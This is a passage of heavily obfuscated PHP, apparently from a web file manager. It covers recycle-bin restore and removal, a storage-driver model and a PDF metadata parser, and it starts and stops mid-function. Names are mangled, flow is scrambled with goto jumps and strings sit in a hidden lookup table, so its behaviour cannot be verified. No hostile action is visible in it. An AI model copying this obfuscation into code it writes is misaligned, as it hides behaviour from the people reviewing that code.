$aÖÂ†ƒ…Œ‘ =& $_SERVER[£ü]; $e¹ŠÏòººÀ = Model($aÖÂ†ƒ…Œ‘[1100]); $aŒ­Ìïù¼Å = $e¹ŠÏòººÀ->sourceInfo($DØ¡ˆ»ËŞƒ); goto eÎÙ‹Á‘; f†ÉçÁ°ß½: $this->recycleMove($DØ¡ˆ»ËŞƒ, 1); if ($aŒ­Ìïù¼Å[$aÖÂ†ƒ…Œ‘[367]] == $aÖÂ†ƒ…Œ‘[83]) { $f…‰¨³¡…• = array($aÖÂ†ƒ…Œ‘[521] => array($aÖÂ†ƒ…Œ‘[479], $aŒ­Ìïù¼Å[$aÖÂ†ƒ…Œ‘[455]] . $DØ¡ˆ»ËŞƒ . $aÖÂ†ƒ…Œ‘[480])); $e¹ŠÏòººÀ->where($f…‰¨³¡…•)->setField($aÖÂ†ƒ…Œ‘[393], 1); } goto C’ï‡”¸ƒ¸; C’ï‡”¸ƒ¸: } public function clear() { $this->remove(!1); } public function remove($d¿³¶ëªî¢ = false) { goto dÙÑ¥é×İÊ; dÙÑ¥é×İÊ: $cÇ†»ö»ÂÒ =& $_SERVER[£ü]; $Fƒ«­¤¦ÏĞ = Model($cÇ†»ö»ÂÒ[1100]); $f¨±Ò´ß¿ = $this->listData(); goto BùÇİ½×Œ; dÈˆ‰ÚˆÏÉ: foreach ($CŞåÚÁÑÒÁ as $eî¾ĞÍçŒ) { $Fƒ«­¤¦ÏĞ->targetSpaceUpdate($eî¾ĞÍçŒ[$cÇ†»ö»ÂÒ[368]], $eî¾ĞÍçŒ[$cÇ†»ö»ÂÒ[452]]); } goto dè«¡ Ü„; BùÇİ½×Œ: $d¿³¶ëªî¢ = $d¿³¶ëªî¢ === !1 ? !1 : $d¿³¶ëªî¢; $CŞåÚÁÑÒÁ = array(); foreach ($f¨±Ò´ß¿ as $fÕÒ¢Ã¾óÆ) { if ($d¿³¶ëªî¢ != !1 && !in_array($fÕÒ¢Ã¾óÆ, $d¿³¶ëªî¢)) { continue; } $Fƒ«­¤¦ÏĞ->remove($fÕÒ¢Ã¾óÆ, !1); $fµÀİ×Å¬ß = $this->where(array($cÇ†»ö»ÂÒ[366] => $fÕÒ¢Ã¾óÆ))->find(); $e›Š½«Ø = $fµÀİ×Å¬ß[$cÇ†»ö»ÂÒ[368]] . $cÇ†»ö»ÂÒ[70] . $fµÀİ×Å¬ß[$cÇ†»ö»ÂÒ[452]]; $CŞåÚÁÑÒÁ[$e›Š½«Ø] = array($cÇ†»ö»ÂÒ[517] => $fµÀİ×Å¬ß[$cÇ†»ö»ÂÒ[368]], $cÇ†»ö»ÂÒ[452] => $fµÀİ×Å¬ß[$cÇ†»ö»ÂÒ[452]]); $this->where(array($cÇ†»ö»ÂÒ[366] => $fÕÒ¢Ã¾óÆ))->delete(); } goto dÈˆ‰ÚˆÏÉ; dè«¡ Ü„: } public function restore($aİŠŸØæ¯¹ = false) { goto d½ä†‡“›; d½ä†‡“›: $BŞŞ¯Ø¸ô¯ =& $_SERVER[£ü]; $d³ø£†¨³ = Model($BŞŞ¯Ø¸ô¯[1100]); $aàÉŸ ¤ = $this->listData(); goto Eİø”¦Ç–Æ; Eİø”¦Ç–Æ: $aİŠŸØæ¯¹ = $aİŠŸØæ¯¹ == !1 ? !1 : $aİŠŸØæ¯¹; if (!$aàÉŸ ¤) { return !0; } $DÕÔ¸é¡á³ = array(); goto EÉˆí»òÁ„; EÉˆí»òÁ„: foreach ($aàÉŸ ¤ as $a·¢ôº„ƒ) { goto b»‚ “Ÿ; DºÙ¿Œ ù: if ($F¢Æ¤¦ƒ”â[$BŞŞ¯Ø¸ô¯[393]] == $BŞŞ¯Ø¸ô¯[83]) { continue; } $d³ø£†¨³->lockMoveStart($a·¢ôº„ƒ); $this->recycleMove($a·¢ôº„ƒ, 0); goto FóÕ†İ„²È; Fõà„‡ÈÃÇ: $DÕÔ¸é¡á³[] = $bİšÃêÉÊ[$BŞŞ¯Ø¸ô¯[457]]; if ($bİšÃêÉÊ[$BŞŞ¯Ø¸ô¯[367]] == $BŞŞ¯Ø¸ô¯[83]) { $DÕÔ¸é¡á³[] = $a·¢ôº„ƒ; } $d³ø£†¨³->lockMoveEnd($a·¢ôº„ƒ); goto DÉöÀàË„î; b»‚ “Ÿ: if ($aİŠŸØæ¯¹ != !1 && !in_array($a·¢ôº„ƒ, $aİŠŸØæ¯¹)) { continue; } $bİšÃêÉÊ = $d³ø£†¨³->sourceInfo($a·¢ôº„ƒ); $F¢Æ¤¦ƒ”â = $d³ø£†¨³->sourceInfo($bİšÃêÉÊ[$BŞŞ¯Ø¸ô¯[457]]); goto DºÙ¿Œ ù; FóÕ†İ„²È: if ($bİšÃêÉÊ[$BŞŞ¯Ø¸ô¯[367]] == $BŞŞ¯Ø¸ô¯[83]) { $C…æ©˜‘õ” = array($BŞŞ¯Ø¸ô¯[521] => array($BŞŞ¯Ø¸ô¯[479], $bİšÃêÉÊ[$BŞŞ¯Ø¸ô¯[455]] . $a·¢ôº„ƒ . $BŞŞ¯Ø¸ô¯[480])); $d³ø£†¨³->where($C…æ©˜‘õ”)->setField($BŞŞ¯Ø¸ô¯[393], 0); } $this->where(array($BŞŞ¯Ø¸ô¯[366] => $a·¢ôº„ƒ))->delete(); $d³ø£†¨³->folderSizeReset($bİšÃêÉÊ[$BŞŞ¯Ø¸ô¯[457]]); goto Fõà„‡ÈÃÇ; DÉöÀàË„î: } $d³ø£†¨³->updateModifyTime($DÕÔ¸é¡á³); goto b¾‰Ê…İŒä; b¾‰Ê…İŒä: } private function recycleMove($E†É‹¡·š, $cÖ–”ªò¡ = 1) { $A‚Îƒà»íÜ =& $_SERVER[£ü]; $D÷ïÉ·Ö¼Ì = Model($A‚Îƒà»íÜ[1100]); $aÇä”Ã°„Ğ = Model($A‚Îƒà»íÜ[2314]); $FÁÃ–ø†Å = array($A‚Îƒà»íÜ[366] => $E†É‹¡·š); if ($cÖ–”ªò¡) { $D÷ïÉ·Ö¼Ì->where($FÁÃ–ø†Å)->setField($A‚Îƒà»íÜ[393], 1); $aÇä”Ã°„Ğ->eventRecycle($E†É‹¡·š, $A‚Îƒà»íÜ[2315]); } else { $B•‰ß»Ôòï = $D÷ïÉ·Ö¼Ì->where($FÁÃ–ø†Å)->find(); $CöÑ‡ÔÏÚË = $B•‰ß»Ôòï[$A‚Îƒà»íÜ[367]] == $A‚Îƒà»íÜ[83]; $BßÀ‹•× ¼ = $D÷ïÉ·Ö¼Ì->fileNameAuto($B•‰ß»Ôòï[$A‚Îƒà»íÜ[457]], $B•‰ß»Ôòï[$A‚Îƒà»íÜ[28]], REPEAT_RENAME_FOLDER, $CöÑ‡ÔÏÚË); if ($BßÀ‹•× ¼ != $B•‰ß»Ôòï[$A‚Îƒà»íÜ[28]]) { $D÷ïÉ·Ö¼Ì->rename($E†É‹¡·š, $BßÀ‹•× ¼); } $D÷ïÉ·Ö¼Ì->where($FÁÃ–ø†Å)->setField($A‚Îƒà»íÜ[393], 0); $aÇä”Ã°„Ğ->eventRecycle($E†É‹¡·š, $A‚Îƒà»íÜ[2316]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\163\x74\157\162\141\147\145\x4c\x69\163\164"; public $field = array("\156\141\x6d\x65", "\163\151\172\x65\115\x61\x78", "\x73\171\163\x74\145\155", "\x64\145\146\141\x75\154\x74", "\144\162\x69\166\x65\162", "\143\x6f\x6e\146\151\147"); public function listData($AŸë¿äŞˆ¦ = false, $c‚“Îé¯–• = "\x6d\x6f\x64\151\146\x79\x54\x69\155\x65", $aª¹ÇÒÈª  = false) { goto a˜êÃ˜ËÚŠ; C®×²â„õ: foreach ($D›×ë…Ñ‹ó as $fÇí¿ğÈÅé => $AÖ«ÓÚ©Ş) { unset($D›×ë…Ñ‹ó[$fÇí¿ğÈÅé][$CìÂÛÏ¦›´[6]]); $D›×ë…Ñ‹ó[$fÇí¿ğÈÅé][$CìÂÛÏ¦›´[2050]] = 0; } $CµÓÍ¶Ú¿˜ = array_to_keyvalue($D›×ë…Ñ‹ó, $CìÂÛÏ¦›´[33], $CìÂÛÏ¦›´[364]); $this->_listAppendSize($D›×ë…Ñ‹ó, $CµÓÍ¶Ú¿˜); goto Bä†­ˆßÇ; Bä†­ˆßÇ: return $D›×ë…Ñ‹ó; goto f ¿á‘èå; a˜êÃ˜ËÚŠ: $CìÂÛÏ¦›´ =& $_SERVER[£ü]; $D›×ë…Ñ‹ó = parent::listData($AŸë¿äŞˆ¦, $c‚“Îé¯–•, $aª¹ÇÒÈª ); if ($AŸë¿äŞˆ¦) { return $D›×ë…Ñ‹ó; } goto C®×²â„õ; f ¿á‘èå: } public function _listAppendSize(&$eÖĞšÓ, $fß¯å—İ¶¦) { $Fßã™ß¯ =& $_SERVER[£ü]; $Cä¶œÛ×¼ = $Fßã™ß¯[2317] . implode($Fßã™ß¯[47], $fß¯å—İ¶¦) . $Fßã™ß¯[2318]; $DˆùÌÊƒ½· = Model($Fßã™ß¯[708])->query($Cä¶œÛ×¼); $DˆùÌÊƒ½· = array_to_keyvalue($DˆùÌÊƒ½·, $Fßã™ß¯[364], $Fßã™ß¯[77]); foreach ($eÖĞšÓ as $DÚâ²éÑ¥‚ => $Bˆ‰ƒÇŠöÒ) { $eÖĞšÓ[$DÚâ²éÑ¥‚][$Fßã™ß¯[2050]] = isset($DˆùÌÊƒ½·[$Bˆ‰ƒÇŠöÒ[$Fßã™ß¯[364]]]) ? $DˆùÌÊƒ½·[$Bˆ‰ƒÇŠöÒ[$Fßã™ß¯[364]]] : 0; } } public function getConfig($fá†ìˆ²À…) { $f‚÷‡–İ£¾ = parent::listData($fá†ìˆ²À…); return json_decode($f‚÷‡–İ£¾[$_SERVER[£ü][6]], !0); } public function update($BÉ¨Àº‰óİ, $aè¡“˜“ßÍ) { goto Dëêµ½…Ñß; Dëêµ½…Ñß: $E“ëÃŒ«ƒ¬ =& $_SERVER[£ü]; $Döº¼»Õ®É = $aè¡“˜“ßÍ[$E“ëÃŒ«ƒ¬[28]]; $c‡•¼ŠÚ = array_to_keyvalue(parent::listData(), $E“ëÃŒ«ƒ¬[28]); goto f¤¢½ĞäŠÉ; f¤¢½ĞäŠÉ: if (isset($c‡•¼ŠÚ[$Döº¼»Õ®É]) && $c‡•¼ŠÚ[$Döº¼»Õ®É][$E“ëÃŒ«ƒ¬[364]] != $BÉ¨Àº‰óİ) { return !1; } if (isset($aè¡“˜“ßÍ[$E“ëÃŒ«ƒ¬[2319]]) && $aè¡“˜“ßÍ[$E“ëÃŒ«ƒ¬[2319]] == $E“ëÃŒ«ƒ¬[83]) { $this->checkConfig($aè¡“˜“ßÍ); } unset($aè¡“˜“ßÍ[$E“ëÃŒ«ƒ¬[2319]]); goto a‘ªô»ÉÆÍ; a‘ªô»ÉÆÍ: $cŠÄª‰êÅİ = parent::update($BÉ¨Àº‰óİ, $aè¡“˜“ßÍ); if ($cŠÄª‰êÅİ && $aè¡“˜“ßÍ[$E“ëÃŒ«ƒ¬[34]]) { foreach ($c‡•¼ŠÚ as $bÎÏÑí†Ğ‡) { if ($bÎÏÑí†Ğ‡[$E“ëÃŒ«ƒ¬[34]] && $bÎÏÑí†Ğ‡[$E“ëÃŒ«ƒ¬[364]] != $BÉ¨Àº‰óİ) { parent::update($bÎÏÑí†Ğ‡[$E“ëÃŒ«ƒ¬[364]], array($E“ëÃŒ«ƒ¬[34] => 0)); } } } return $cŠÄª‰êÅİ; goto EˆöÅ²•ø; EˆöÅ²•ø: } public function add($bç³•«ÒË) { goto FŒÛ³©¦¦ù; F‰Ú«ŞïÏ®: $this->checkConfig($bç³•«ÒË); $a³–ÀÈóÚ  = parent::insert($bç³•«ÒË); if ($a³–ÀÈóÚ  && $bç³•«ÒË[$a©ï÷›’¥×[34]]) { foreach ($D¥ÑÈõôğª as $bíèÅÒŒªÍ) { if ($bíèÅÒŒªÍ[$a©ï÷›’¥×[34]]) { parent::update($bíèÅÒŒªÍ[$a©ï÷›’¥×[364]], array($a©ï÷›’¥×[34] => 0)); } } } goto Cï³©Ë‡Îó; Cï³©Ë‡Îó: return $a³–ÀÈóÚ ; goto EÄòÃàƒÎ; FŒÛ³©¦¦ù: $a©ï÷›’¥× =& $_SERVER[£ü]; $D¥ÑÈõôğª = array_to_keyvalue(parent::listData(), $a©ï÷›’¥×[28]); if (isset($D¥ÑÈõôğª[$bç³•«ÒË[$a©ï÷›’¥×[28]]])) { return !1; } goto F‰Ú«ŞïÏ®; EÄòÃàƒÎ: } public function checkConfig(&$cŸ®¬‡‘²Ñ) { goto cëµâˆáÛ½; cëµâˆáÛ½: $eèáŠ˜Éç =& $_SERVER[£ü]; $f‡ñ¦®·å = strtolower($cŸ®¬‡‘²Ñ[$eèáŠ˜Éç[90]]); $fß‰ÁÚÍ•Û = json_decode_force($cŸ®¬‡‘²Ñ[$eèáŠ˜Éç[6]]); goto fçØğ¨éİ°; fçØğ¨éİ°: foreach ($fß‰ÁÚÍ•Û as $FØ¯¤ù¶Ü³ => $F¹³³ê˜«’) { $fß‰ÁÚÍ•Û[$FØ¯¤ù¶Ü³] = trim($F¹³³ê˜«’); } $dçø¼²™’´ = rtrim($fß‰ÁÚÍ•Û[$eèáŠ˜Éç[1012]], $eèáŠ˜Éç[8]) . $eèáŠ˜Éç[8]; $B·Ê¡·ÀÇì = $this->driverType($f‡ñ¦®·å); goto D‚Ï‡ã±®; D‚Ï‡ã±®: $AÆªõ™¿­ = $eèáŠ˜Éç[71] . $B·Ê¡·ÀÇì; $eŞŒ¬£¯Øë = new $AÆªõ™¿­($fß‰ÁÚÍ•Û); if (in_array($f‡ñ¦®·å, $eŞŒ¬£¯Øë->objectDriver)) { if (!$eŞŒ¬£¯Øë->isBucketCors() && !$eŞŒ¬£¯Øë->setBucketCors()) { $eèƒõåĞÌÃ = LNG($eèáŠ˜Éç[2320]); $eèƒõåĞÌÃ .= $eèáŠ˜Éç[2321] . LNG($eèáŠ˜Éç[2322]); show_json($eèƒõåĞÌÃ, !1); } } goto bó¼îŸÏí; dÍœ¬’™µ¼: $cŸ®¬‡‘²Ñ[$eèáŠ˜Éç[6]] = json_encode($fß‰ÁÚÍ•Û); $cŸ®¬‡‘²Ñ[$eèáŠ˜Éç[90]] = $B·Ê¡·ÀÇì; return !0; goto eßØĞ¬‡º; bó¼îŸÏí: $D†¨ßâçÅÁ = $eŞŒ¬£¯Øë->getPath($dçø¼²™’´ . $eèáŠ˜Éç[1946]); if (!$eŞŒ¬£¯Øë->mkfile($D†¨ßâçÅÁ)) { show_json(LNG($eèáŠ˜Éç[2320]), !1); } $fß‰ÁÚÍ•Û[$eèáŠ˜Éç[1012]] = $dçø¼²™’´; goto dÍœ¬’™µ¼; eßØĞ¬‡º: } private function driverType($Eø¨±Œ±) { $C¸Û“Œ„Ùä =& $_SERVER[£ü]; $E£¨®Œ…·ê = array($C¸Û“Œ„Ùä[103] => $C¸Û“Œ„Ùä[2323], $C¸Û“Œ„Ùä[58] => $C¸Û“Œ„Ùä[2324], $C¸Û“Œ„Ùä[64] => $C¸Û“Œ„Ùä[2325]); if (isset($E£¨®Œ…·ê[$Eø¨±Œ±])) { return $E£¨®Œ…·ê[$Eø¨±Œ±]; } return strtoupper($Eø¨±Œ±); } public function driverListSystem() { $AÃÛïæ§—ò =& $_SERVER[£ü]; $d™ÄøÎøĞ„ = parent::listData(); $c¾¦¦˜×¹Æ = array(); foreach ($d™ÄøÎøĞ„ as $eÌ˜˜ãÂš) { unset($eÌ˜˜ãÂš[$AÃÛïæ§—ò[184]], $eÌ˜˜ãÂš[$AÃÛïæ§—ò[107]]); $eÌ˜˜ãÂš[$AÃÛïæ§—ò[6]] = json_decode_force($eÌ˜˜ãÂš[$AÃÛïæ§—ò[6]]); $c¾¦¦˜×¹Æ[] = $eÌ˜˜ãÂš; } return $c¾¦¦˜×¹Æ; } public function defaultDriver() { $F÷íà³¶‘ =& $_SERVER[£ü]; $FšÚÁÇ•º¾ = parent::listData(); $aÍ‚¨¥­• = array_filter_by_field($FšÚÁÇ•º¾, $F÷íà³¶‘[34], 1); $aÍ‚¨¥­• = $aÍ‚¨¥­•[0]; if ($aÍ‚¨¥­•) { $aÍ‚¨¥­•[$F÷íà³¶‘[6]] = json_decode($aÍ‚¨¥­•[$F÷íà³¶‘[6]], !0); } return $aÍ‚¨¥­•; } public function driverInfo($AÍÎÒÀø») { $ağˆÏŸ÷ªÑ =& $_SERVER[£ü]; $cèçéìÇœ‡ = array_to_keyvalue(parent::listData(), $ağˆÏŸ÷ªÑ[364]); if (!isset($cèçéìÇœ‡[$AÍÎÒÀø»])) { return !1; } $e‘ªÖ çíº = $cèçéìÇœ‡[$AÍÎÒÀø»]; $e‘ªÖ çíº[$ağˆÏŸ÷ªÑ[6]] = json_decode_force($e‘ªÖ çíº[$ağˆÏŸ÷ªÑ[6]]); return $e‘ªÖ çíº; } public function removeWithFile($f·¾èĞ‘¥Û) { goto fÕÅ…Šç¥Ï; E±ºÈé‘‹ì: if (!$bì¬Â‰„Ú„) { $f¥ƒ‹ùá->stop($eí«éº‚†); return !1; } $f¥ƒ‹ùá->end(); return parent::remove($f·¾èĞ‘¥Û); goto AĞä®¨Ó …; fÕÅ…Šç¥Ï: $c¯Şë½‚õŠ =& $_SERVER[£ü]; $F´èø°¯ğ = array($c¯Şë½‚õŠ[739] => $f·¾èĞ‘¥Û); $Dºµƒí¥…± = Model($c¯Şë½‚õŠ[418])->where($F´èø°¯ğ)->count(); goto EÂ¡Ö‡Æˆø; c‡³‚šºÒª: $f¥ƒ‹ùá->task[$c¯Şë½‚õŠ[687]] = (double) $A³‡Á…‹ƒê; $CÁ©ôÒÅÖÎ = KodIO::defaultDriver(); $cš¿îŠ²‹ = $CÁ©ôÒÅÖÎ[$c¯Şë½‚õŠ[364]]; goto BÄª©‘Í‡; EÂ¡Ö‡Æˆø: $A³‡Á…‹ƒê = Model($c¯Şë½‚õŠ[418])->where($F´èø°¯ğ)->sum($c¯Şë½‚õŠ[77]); $eí«éº‚† = $c¯Şë½‚õŠ[2326] . $f·¾èĞ‘¥Û; $f¥ƒ‹ùá = new TaskFileTransfer($eí«éº‚†, $c¯Şë½‚õŠ[2327], $Dºµƒí¥…±, LNG($c¯Şë½‚õŠ[2328]) . "\50{$f·¾èĞ‘¥Û}\51"); goto c‡³‚šºÒª; B±±ì±ÉÍŠ: $a‰İ˜¬«« = Model($c¯Şë½‚õŠ[164])->where($F´èø°¯ğ)->field($c¯Şë½‚õŠ[2329])->select(); foreach ($a‰İ˜¬«« as $FØôÖ˜Àì) { goto BâÓÀ‚·„…; BâÓÀ‚·„…: $dË½œ©ÂÊ = $FØôÖ˜Àì[$c¯Şë½‚õŠ[75]]; $a¥Úë–°‹© = $AßÈ—˜ Ô£ . str_replace("\173\x69\x6f\72{$f·¾èĞ‘¥Û}\175\57", $c¯Şë½‚õŠ[33], $dË½œ©ÂÊ); if (!IO::exist($dË½œ©ÂÊ)) { $dô×°Ÿ—´™[] = $FØôÖ˜Àì[$c¯Şë½‚õŠ[415]]; $f¥ƒ‹ùá->updateFileEnd($FØôÖ˜Àì[$c¯Şë½‚õŠ[28]], $FØôÖ˜Àì[$c¯Şë½‚õŠ[77]]); continue; } goto AùÁ»¯Ë; cê‘ù¤Œè: $A‹Ôˆ‹Û÷µ = array($c¯Şë½‚õŠ[739] => $cš¿îŠ²‹, $c¯Şë½‚õŠ[75] => $a¥Úë–°‹©); Model($c¯Şë½‚õŠ[164])->where($F´èø°¯ğ)->save($A‹Ôˆ‹Û÷µ); goto E ïùƒÊª§; AùÁ»¯Ë: if (IO::exist($a¥Úë–°‹©)) { $f¥ƒ‹ùá->updateFileEnd($FØôÖ˜Àì[$c¯Şë½‚õŠ[28]], $FØôÖ˜Àì[$c¯Şë½‚õŠ[77]]); continue; } if (!IO::move($dË½œ©ÂÊ, get_path_father($a¥Úë–°‹©))) { $bì¬Â‰„Ú„ = !1; break; } $F´èø°¯ğ = array($c¯Şë½‚õŠ[415] => $FØôÖ˜Àì[$c¯Şë½‚õŠ[415]]); goto cê‘ù¤Œè; E ïùƒÊª§: } $this->removeByFileID($dô×°Ÿ—´™); goto E±ºÈé‘‹ì; BÄª©‘Í‡: $AßÈ—˜ Ô£ = "\173\151\157\72{$cš¿îŠ²‹}\x7d\57"; $bì¬Â‰„Ú„ = !0; $dô×°Ÿ—´™ = array(); goto B±±ì±ÉÍŠ; AĞä®¨Ó …: } public function progress($bÄê›Ìšë) { return Task::get($_SERVER[£ü][2326] . $bÄê›Ìšë); } private function removeByFileID($e­ô²óèª¨ = array()) { goto F¥‘·°êî‘; bò¨Æ¶¯¿: foreach ($F•ˆõÕ†„‹ as $b÷¬À÷·õÜ) { Model($f®‘Ù©ÔĞ¤[379])->removeNow($b÷¬À÷·õÜ, !1); } goto A‰”ÒÇ¥ØÔ; F¥‘·°êî‘: $f®‘Ù©ÔĞ¤ =& $_SERVER[£ü]; if (empty($e­ô²óèª¨)) { return; } $FÖå¼Ó÷• = array($f®‘Ù©ÔĞ¤[415] => array($f®‘Ù©ÔĞ¤[7], $e­ô²óèª¨)); goto DçŒÉ™ù© ; DçŒÉ™ù© : $F•ˆõÕ†„‹ = Model($f®‘Ù©ÔĞ¤[1100])->where($FÖå¼Ó÷•)->field($f®‘Ù©ÔĞ¤[366])->select(); if (!$F•ˆõÕ†„‹) { return; } $F•ˆõÕ†„‹ = array_to_keyvalue($F•ˆõÕ†„‹, $f®‘Ù©ÔĞ¤[33], $f®‘Ù©ÔĞ¤[366]); goto bò¨Æ¶¯¿; A‰”ÒÇ¥ØÔ: } } goto DâŞË†õ¥; CÅ ¹ ˆˆ¤: class FileParsePdf { public static function parse($e“ÉºÁò–) { goto B÷×È¢ã»; aŠ‹¤¨ ×À: if ($cçé®Ş—¨ë) { $B†½íßºÅô = $cçé®Ş—¨ë[$a§ÊÚ± Å[1495]][$a§ÊÚ± Å[1174]]; $A†Áí‘·¬Ì = self::getObjectValue($bÑ÷³¥Ò, $cçé®Ş—¨ë, $B†½íßºÅô); } $A†Áí‘·¬Ì = is_array($A†Áí‘·¬Ì) ? $A†Áí‘·¬Ì : array(); $A†Áí‘·¬Ì[$a§ÊÚ± Å[1496]] = 0; goto F‚ó¹àĞ®á; D¯êïÅ†Å¼: if ($d‡Š„ñÀíÚ[1] && $A†Áí‘·¬Ì[$a§ÊÚ± Å[1500]] < $d‡Š„ñÀíÚ[1][0]) { $A†Áí‘·¬Ì[$a§ÊÚ± Å[1500]] = $d‡Š„ñÀíÚ[1][0]; } $A†Áí‘·¬Ì = self::parseInfoItem($A†Áí‘·¬Ì); return $A†Áí‘·¬Ì; goto AëÓŠµŞŒ“; EßÀ«¹Ù§•: if ($d‡Š„ñÀíÚ) { $A†Áí‘·¬Ì[$a§ÊÚ± Å[1308]] = $d‡Š„ñÀíÚ[1]; } $A†Áí‘·¬Ì[$a§ÊÚ± Å[1500]] = 0; $Cç¥¸ÎÁÙ = $a§ÊÚ± Å[1501]; goto dë‚„ÍÒ®; e»Ø†ˆŠÊ‰: $bÑ÷³¥Ò[$a§ÊÚ± Å[1493]] = StreamWrapperIO::read($e“ÉºÁò–, 0, $cØÏßŞÕ‹); $bÑ÷³¥Ò[$a§ÊÚ± Å[1494]] = StreamWrapperIO::read($e“ÉºÁò–, $bÑ÷³¥Ò[$a§ÊÚ± Å[77]] - $cØÏßŞÕ‹, $cØÏßŞÕ‹); $cçé®Ş—¨ë = self::decodeXref($bÑ÷³¥Ò); goto aŠ‹¤¨ ×À; dë‚„ÍÒ®: preg_match_all($Cç¥¸ÎÁÙ, $bÑ÷³¥Ò[$a§ÊÚ± Å[1493]], $d‡Š„ñÀíÚ); if ($d‡Š„ñÀíÚ[1] && $A†Áí‘·¬Ì[$a§ÊÚ± Å[1500]] < $d‡Š„ñÀíÚ[1][0]) { $A†Áí‘·¬Ì[$a§ÊÚ± Å[1500]] = $d‡Š„ñÀíÚ[1][0]; } preg_match_all($Cç¥¸ÎÁÙ, $bÑ÷³¥Ò[$a§ÊÚ± Å[1494]], $d‡Š„ñÀíÚ); goto D¯êïÅ†Å¼; B÷×È¢ã»: $a§ÊÚ± Å =& $_SERVER[£ü]; $cØÏßŞÕ‹ = 32 * 1024; $bÑ÷³¥Ò = array($a§ÊÚ± Å[771] => fopen($e“ÉºÁò–, $a§ÊÚ± Å[1152]), $a§ÊÚ± Å[75] => $e“ÉºÁò–, $a§ÊÚ± Å[77] => filesize($e“ÉºÁò–), $a§ÊÚ± Å[1492] => $cØÏßŞÕ‹); goto e»Ø†ˆŠÊ‰; F‚ó¹àĞ®á: $Cç¥¸ÎÁÙ = $a§ÊÚ± Å[1497]; preg_match($Cç¥¸ÎÁÙ, $bÑ÷³¥Ò[$a§ÊÚ± Å[1493]], $d‡Š„ñÀíÚ); if (!$A†Áí‘·¬Ì[$a§ÊÚ± Å[1496]] && count($d‡Š„ñÀíÚ) == 5) { $A†Áí‘·¬Ì[$a§ÊÚ± Å[1496]] = $d‡Š„ñÀíÚ[3]; $A†Áí‘·¬Ì[$a§ÊÚ± Å[1498]] = $d‡Š„ñÀíÚ[4]; } goto C£—×ÇÂàÖ; C£—×ÇÂàÖ: preg_match($Cç¥¸ÎÁÙ, $bÑ÷³¥Ò[$a§ÊÚ± Å[1494]], $d‡Š„ñÀíÚ); if (!$A†Áí‘·¬Ì[$a§ÊÚ± Å[1496]] && count($d‡Š„ñÀíÚ) == 5) { $A†Áí‘·¬Ì[$a§ÊÚ± Å[1496]] = $d‡Š„ñÀíÚ[3]; $A†Áí‘·¬Ì[$a§ÊÚ± Å[1498]] = $d‡Š„ñÀíÚ[4]; } preg_match($a§ÊÚ± Å[1499], $bÑ÷³¥Ò[$a§ÊÚ± Å[1493]], $d‡Š„ñÀíÚ); goto EßÀ«¹Ù§•; AëÓŠµŞŒ“: } private static function parseInfoItem($bì®Î½ß„ß) { $d»•¬Õ— =& $_SERVER[£ü]; if (!$bì®Î½ß„ß) { return !1; } $f±°Şİ‹¸¼ = array($d»•¬Õ—[1309] => array($d»•¬Õ—[1502], $d»•¬Õ—[33]), $d»•¬Õ—[1503] => array($d»•¬Õ—[1504], $d»•¬Õ—[33]), $d»•¬Õ—[184] => array($d»•¬Õ—[1505], $d»•¬Õ—[207]), $d»•¬Õ—[107] => array($d»•¬Õ—[1506], $d»•¬Õ—[207]), $d»•¬Õ—[1500] => array($d»•¬Õ—[1500], $d»•¬Õ—[273]), $d»•¬Õ—[1496] => array($d»•¬Õ—[1496], $d»•¬Õ—[273]), $d»•¬Õ—[1498] => array($d»•¬Õ—[1498], $d»•¬Õ—[273]), $d»•¬Õ—[1507] => array($d»•¬Õ—[1508], $d»•¬Õ—[33]), $d»•¬Õ—[1509] => array($d»•¬Õ—[1510], $d»•¬Õ—[33]), $d»•¬Õ—[1511] => array($d»•¬Õ—[1308], $d»•¬Õ—[33])); $B©Ş©È¬×„ = array(); foreach ($f±°Şİ‹¸¼ as $Eƒë‘¬Šäœ => $bâøÈéÉÑ‹) { if (!isset($bì®Î½ß„ß[$bâøÈéÉÑ‹[0]])) { continue; } $c«¥›éµ²Õ = $bì®Î½ß„ß[$bâøÈéÉÑ‹[0]]; if (!$c«¥›éµ²Õ || is_array($c«¥›éµ²Õ)) { continue; } switch ($bâøÈéÉÑ‹[1]) { case $d»•¬Õ—[273]: $c«¥›éµ²Õ = intval($c«¥›éµ²Õ); break; case $d»•¬Õ—[207]: if (substr($c«¥›éµ²Õ, 0, 2) == $d»•¬Õ—[1512]) { $c«¥›éµ²Õ = substr($c«¥›éµ²Õ, 2, 14); } if (strtotime($c«¥›éµ²Õ)) { $c«¥›éµ²Õ = date($d»•¬Õ—[1513], strtotime($c«¥›éµ²Õ)); } break; } $B©Ş©È¬×„[$Eƒë‘¬Šäœ] = $c«¥›éµ²Õ; } return $B©Ş©È¬×„; } private static function decodeXref(&$EäŞ•ğ…Ú•) { goto D×Ã­°Øš³; d¥¦¦÷õ¤Ğ: if (preg_match($b…‚±ÆÊáò[1528], $d÷„Ã¦†Ñ‰, $fßÁñ‹¢äƒ) > 0) { } return $F•‰§ä×; goto F¿ôºñâ‚à; Cï¨ª––¾µ: if (preg_match($b…‚±ÆÊáò[1526], $d÷„Ã¦†Ñ‰, $fßÁñ‹¢äƒ) > 0) { $F•‰§ä×[$b…‚±ÆÊáò[1495]][$b…‚±ÆÊáò[1174]] = intval($fßÁñ‹¢äƒ[1]) . $b…‚±ÆÊáò[70] . intval($fßÁñ‹¢äƒ[2]); } if (preg_match($b…‚±ÆÊáò[1527], $d÷„Ã¦†Ñ‰, $fßÁñ‹¢äƒ) > 0) { $F•‰§ä×[$b…‚±ÆÊáò[1495]][$b…‚±ÆÊáò[364]] = array(); $F•‰§ä×[$b…‚±ÆÊáò[1495]][$b…‚±ÆÊáò[364]][0] = $fßÁñ‹¢äƒ[1]; $F•‰§ä×[$b…‚±ÆÊáò[1495]][$b…‚±ÆÊáò[364]][1] = $fßÁñ‹¢äƒ[2]; } if (!$F•‰§ä×[$b…‚±ÆÊáò[1495]][$b…‚±ÆÊáò[1174]]) { return !1; } goto d¥¦¦÷õ¤Ğ; D×Ã­°Øš³: $b…‚±ÆÊáò =& $_SERVER[£ü]; $dé¬æ’áÃç = $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[1494]]; $F•‰§ä× = array($b…‚±ÆÊáò[1495] => array(), $b…‚±ÆÊáò[1514] => array()); goto DŠ¡ŸÎ×àÎ; e‹–ˆÈë¯à: if (preg_match($b…‚±ÆÊáò[1521], $d÷„Ã¦†Ñ‰, $fßÁñ‹¢äƒ) > 0) { 